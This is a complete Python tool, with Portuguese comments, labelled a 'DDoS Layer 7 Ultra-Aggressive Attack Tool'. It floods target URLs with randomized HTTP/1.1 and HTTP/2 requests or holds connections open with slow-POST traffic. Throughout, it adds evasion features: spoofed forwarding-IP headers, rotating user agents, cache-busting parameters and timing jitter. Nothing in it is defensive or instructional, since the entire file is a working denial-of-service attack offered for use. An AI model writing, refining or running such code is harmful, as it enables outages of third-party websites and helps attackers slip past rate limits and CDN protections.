#!/usr/bin/env python3
import asyncio
import random
import time
import sys
import json
import socket
import ssl
from urllib.parse import urlparse
from concurrent.futures import ThreadPoolExecutor
import aiohttp
import httpx
from hyper import HTTPConnection
from hyper.tls import init_context
import uuid
import string
import argparse
from typing import List, Dict, Optional, Union
import logging
from datetime import datetime

# Configuração de logging
logging.basicConfig(
    level=logging.INFO,
    format='\033[1;31m[%(asctime)s] [%(levelname)s] %(message)s\033[0m',
    handlers=[logging.StreamHandler()]
)
logger = logging.getLogger('DDoS-L7-ULTRA')

class AttackStats:
    def __init__(self):
        self.total_requests = 0
        self.successful = 0
        self.errors = 0
        self.last_update = time.time()
        self.start_time = time.time()
        self.rps = 0

    def update(self, success: bool):
        self.total_requests += 1
        if success:
            self.successful += 1
        else:
            self.errors += 1

    def calculate_rps(self):
        now = time.time()
        elapsed = now - self.last_update
        if elapsed >= 1:
            self.rps = int((self.total_requests / (now - self.start_time)) if (now - self.start_time) > 0 else 0)
            self.last_update = now
        return self.rps

class Target:
    def __init__(self, url: str):
        self.url = url
        parsed = urlparse(url)
        self.scheme = parsed.scheme
        self.host = parsed.netloc
        self.path = parsed.path if parsed.path else '/'
        self.port = parsed.port or (443 if self.scheme == 'https' else 80)
        self.is_https = self.scheme == 'https'

class DDoSAttack:
    def __init__(self, targets: List[str], duration: int, max_threads: int, max_async: int, mode: str, jitter: float):
        self.targets = [Target(url) for url in targets]
        self.duration = duration
        self.max_threads = max_threads
        self.max_async = max_async
        self.mode = mode
        self.jitter = jitter
        self.stats = AttackStats()
        self.running = True
        self.user_agents = self._load_user_agents()
        self.headers_templates = self._generate_headers_templates()
        self.post_data_templates = self._generate_post_data_templates()
        self.session_cookies = {target.host: f"SESSION_{uuid.uuid4().hex}" for target in self.targets}

    @staticmethod
    def _load_user_agents() -> List[str]:
        return [
            # Navegadores modernos
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
            # Crawlers
            "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
            "Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)",
            # Ferramentas
            "curl/7.68.0",
            "Wget/1.20.3",
            # Dispositivos móveis
            "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1"
        ]

    def _generate_headers_templates(self) -> List[Dict[str, str]]:
        base_headers = [
            {
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                "Accept-Encoding": "gzip, deflate, br",
                "Accept-Language": "en-US,en;q=0.5",
                "Cache-Control": "no-cache",
                "Connection": "keep-alive",
                "Pragma": "no-cache",
                "Upgrade-Insecure-Requests": "1"
            },
            {
                "Accept": "application/json, text/javascript, */*; q=0.01",
                "Accept-Encoding": "identity",
                "Accept-Language": "en-US,en;q=0.9",
                "Connection": "keep-alive",
                "X-Requested-With": "XMLHttpRequest"
            },
            {
                "Accept": "*/*",
                "Accept-Encoding": "gzip, deflate",
                "Connection": "keep-alive",
                "Content-Type": "application/x-www-form-urlencoded"
            }
        ]
        
        # Adiciona headers aleatórios
        for headers in base_headers:
            if random.choice([True, False]):
                headers["X-Forwarded-For"] = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
            if random.choice([True, False]):
                headers["X-Real-IP"] = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
            if random.choice([True, False]):
                headers["CF-Connecting-IP"] = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
        
        return base_headers

    def _generate_post_data_templates(self) -> List[Union[str, Dict]]:
        return [
            # JSON
            json.dumps({"username": "admin", "password": "password123", "token": str(uuid.uuid4())}),
            json.dumps({"query": "mutation { login(input: {email: \"user@example.com\", password: \"password\"}) { token } }"}),
            json.dumps({"id": random.randint(1, 10000), "data": "A" * random.randint(100, 1000)}),
            
            # Form data
            "username=admin&password=password123&captcha=" + "".join(random.choices(string.ascii_letters + string.digits, k=32)),
            "search=" + "".join(random.choices(string.ascii_letters, k=random.randint(10, 50))) + "&submit=true",
            
            # XML
            f"<request><id>{random.randint(1, 10000)}</id><data>{'A' * random.randint(50, 500)}</data></request>"
        ]

    def _get_random_headers(self, target: Target) -> Dict[str, str]:
        headers = random.choice(self.headers_templates).copy()
        headers["User-Agent"] = random.choice(self.user_agents)
        
        # Adiciona parâmetros aleatórios para cache busting
        if random.choice([True, False]):
            headers["Cache-Buster"] = str(uuid.uuid4())
        
        # Adiciona cookies persistentes para o mesmo host
        if target.host in self.session_cookies:
            headers["Cookie"] = f"session_id={self.session_cookies[target.host]}; tracking_id={uuid.uuid4().hex}"
        
        return headers

    def _get_random_post_data(self) -> Union[str, Dict]:
        return random.choice(self.post_data_templates)

    def _get_random_method(self) -> str:
        methods = ["GET", "POST", "HEAD", "PUT", "DELETE", "OPTIONS", "PATCH"]
        weights = [0.4, 0.3, 0.1, 0.1, 0.05, 0.03, 0.02]
        return random.choices(methods, weights=weights)[0]

    async def _http_flood_attack(self, target: Target, session: aiohttp.ClientSession):
        try:
            method = self._get_random_method()
            headers = self._get_random_headers(target)
            url = f"{target.scheme}://{target.host}{target.path}"
            
            # Adiciona parâmetros aleatórios à URL
            if random.choice([True, False]):
                url += f"?cache_bust={uuid.uuid4().hex}&random_param={random.randint(1, 100000)}"
            
            # Para métodos POST/PUT, adiciona dados aleatórios
            data = None
            if method in ["POST", "PUT", "PATCH"]:
                data = self._get_random_post_data()
                if isinstance(data, dict):
                    headers["Content-Type"] = "application/json"
                else:
                    headers["Content-Type"] = random.choice([
                        "application/x-www-form-urlencoded",
                        "multipart/form-data",
                        "text/xml"
                    ])
            
            # Delay aleatório para evitar padrões
            if self.jitter > 0:
                await asyncio.sleep(random.uniform(0, self.jitter))
            
            # Envia a requisição
            async with session.request(
                method=method,
                url=url,
                headers=headers,
                data=data,
                timeout=30,
                allow_redirects=True,
                ssl=False
            ) as response:
                # Atualiza estatísticas
                self.stats.update(response.status < 400)
                
                # Se receber 429 (Too Many Requests), espera um pouco
                if response.status == 429:
                    await asyncio.sleep(random.uniform(1, 5))
                
                return response.status
        except Exception as e:
            self.stats.update(False)
            return None

    async def _slow_post_attack(self, target: Target):
        try:
            # Cria uma conexão TCP raw
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(10)
            
            if target.is_https:
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                sock = context.wrap_socket(sock, server_hostname=target.host)
            
            await asyncio.get_event_loop().run_in_executor(
                None, lambda: sock.connect((target.host, target.port))
            )
            
            # Envia o cabeçalho POST lentamente
            headers = self._get_random_headers(target)
            post_data = self._get_random_post_data()
            
            request_lines = [
                f"POST {target.path} HTTP/1.1",
                f"Host: {target.host}",
                f"Content-Length: {len(post_data) * 10}",  # Tamanho incorreto para confundir
                f"Content-Type: {random.choice(['application/json', 'application/x-www-form-urlencoded'])}",
                f"User-Agent: {random.choice(self.user_agents)}",
                "Connection: keep-alive"
            ]
            
            # Adiciona outros headers
            for key, value in headers.items():
                if key.lower() not in ['host', 'content-length', 'content-type', 'user-agent', 'connection']:
                    request_lines.append(f"{key}: {value}")
            
            request_lines.append("\r\n")
            request = "\r\n".join(request_lines)
            
            # Envia a requisição em pedaços lentamente
            for chunk in [request[i:i+10] for i in range(0, len(request), 10)]:
                sock.send(chunk.encode())
                await asyncio.sleep(random.uniform(0.1, 1.0))
            
            # Mantém a conexão aberta enviando dados aleatórios
            start_time = time.time()
            while self.running and (time.time() - start_time) < 30:  # Mantém por até 30 segundos
                try:
                    sock.send(b"." * random.randint(1, 10))
                    await asyncio.sleep(random.uniform(1, 5))
                except:
                    break
            
            sock.close()
            self.stats.update(True)
        except Exception as e:
            self.stats.update(False)

    async def _attack_worker(self, target: Target):
        if self.mode == "http_flood":
            # Usa HTTP/1.1 e HTTP/2 alternadamente
            if random.choice([True, False]):
                # HTTP/1.1 com aiohttp
                connector = aiohttp.TCPConnector(force_close=False, limit=0, ssl=False)
                timeout = aiohttp.ClientTimeout(total=30)
                async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
                    while self.running:
                        await self._http_flood_attack(target, session)
            else:
                # HTTP/2 com httpx
                async with httpx.AsyncClient(http2=True, timeout=30) as client:
                    while self.running:
                        try:
                            method = self._get_random_method()
                            headers = self._get_random_headers(target)
                            url = f"{target.scheme}://{target.host}{target.path}"
                            
                            if random.choice([True, False]):
                                url += f"?cache_bust={uuid.uuid4().hex}"
                            
                            data = None
                            if method in ["POST", "PUT", "PATCH"]:
                                data = self._get_random_post_data()
                            
                            if self.jitter > 0:
                                await asyncio.sleep(random.uniform(0, self.jitter))
                            
                            response = await client.request(
                                method=method,
                                url=url,
                                headers=headers,
                                content=data,
                                follow_redirects=True
                            )
                            
                            self.stats.update(response.status_code < 400)
                            if response.status_code == 429:
                                await asyncio.sleep(random.uniform(1, 5))
                        except:
                            self.stats.update(False)
        elif self.mode == "slow_post":
            while self.running:
                await self._slow_post_attack(target)

    async def _print_stats(self):
        start_time = time.time()
        last_requests = 0
        
        while self.running:
            await asyncio.sleep(1)
            current_time = time.time()
            elapsed = current_time - start_time
            remaining = max(0, self.duration - elapsed)
            
            rps = self.stats.calculate_rps()
            total = self.stats.total_requests
            success = self.stats.successful
            errors = self.stats.errors
            
            logger.info(
                f"Attack Running | RPS: {rps} | "
                f"Total: {total} | Success: {success} | Errors: {errors} | "
                f"Elapsed: {int(elapsed)}s | Remaining: {int(remaining)}s"
            )
            
            if elapsed >= self.duration:
                self.running = False

    async def run(self):
        # Inicia as workers para cada target
        tasks = []
        for target in self.targets:
            for _ in range(self.max_async):
                tasks.append(asyncio.create_task(self._attack_worker(target)))
        
        # Inicia a task de estatísticas
        stats_task = asyncio.create_task(self._print_stats())
        
        # Executa pelo tempo especificado
        await asyncio.sleep(self.duration)
        self.running = False
        
        # Aguarda todas as tasks finalizarem
        await asyncio.gather(*tasks, return_exceptions=True)
        await stats_task
        
        # Exibe estatísticas finais
        logger.info("\nAttack Finished!")
        logger.info(f"Total Requests: {self.stats.total_requests}")
        logger.info(f"Successful: {self.stats.successful}")
        logger.info(f"Errors: {self.stats.errors}")
        logger.info(f"Average RPS: {int(self.stats.total_requests / self.duration) if self.duration > 0 else 0}")

def main():
    parser = argparse.ArgumentParser(description="DDoS Layer 7 Ultra-Aggressive Attack Tool")
    parser.add_argument("--targets", required=True, help="File containing target URLs (one per line)")
    parser.add_argument("--time", type=int, default=60, help="Attack duration in seconds")
    parser.add_argument("--threads", type=int, default=100, help="Number of threads")
    parser.add_argument("--async", type=int, dest="max_async", default=50, help="Async workers per thread")
    parser.add_argument("--mode", choices=["http_flood", "slow_post"], default="http_flood", help="Attack mode")
    parser.add_argument("--jitter", type=float, default=0.1, help="Random delay between requests")
    
    args = parser.parse_args()
    
    # Carrega os targets
    try:
        with open(args.targets, 'r') as f:
            targets = [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        logger.error(f"Target file not found: {args.targets}")
        sys.exit(1)
    
    if not targets:
        logger.error("No valid targets found in the file")
        sys.exit(1)
    
    # Validação básica dos URLs
    valid_targets = []
    for url in targets:
        parsed = urlparse(url)
        if not parsed.scheme or not parsed.netloc:
            logger.warning(f"Invalid URL skipped: {url}")
            continue
        valid_targets.append(url)
    
    if not valid_targets:
        logger.error("No valid URLs found after validation")
        sys.exit(1)
    
    # Configura o asyncio para Windows
    if sys.platform == 'win32':
        asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
    
    # Inicia o ataque
    attack = DDoSAttack(
        targets=valid_targets,
        duration=args.time,
        max_threads=args.threads,
        max_async=args.max_async,
        mode=args.mode,
        jitter=args.jitter
    )
    
    logger.info(f"Starting {args.mode} attack on {len(valid_targets)} target(s) for {args.time} seconds...")
    logger.info(f"Threads: {args.threads}, Async workers per thread: {args.max_async}")
    
    # Executa com ThreadPoolExecutor para melhor performance
    with ThreadPoolExecutor(max_workers=args.threads) as executor:
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        
        try:
            loop.run_until_complete(attack.run())
        except KeyboardInterrupt:
            logger.info("Attack interrupted by user")
            attack.running = False
            loop.run_until_complete(asyncio.sleep(1))  # Aguarda tasks finalizarem
        finally:
            loop.close()

if __name__ == "__main__":
    main()
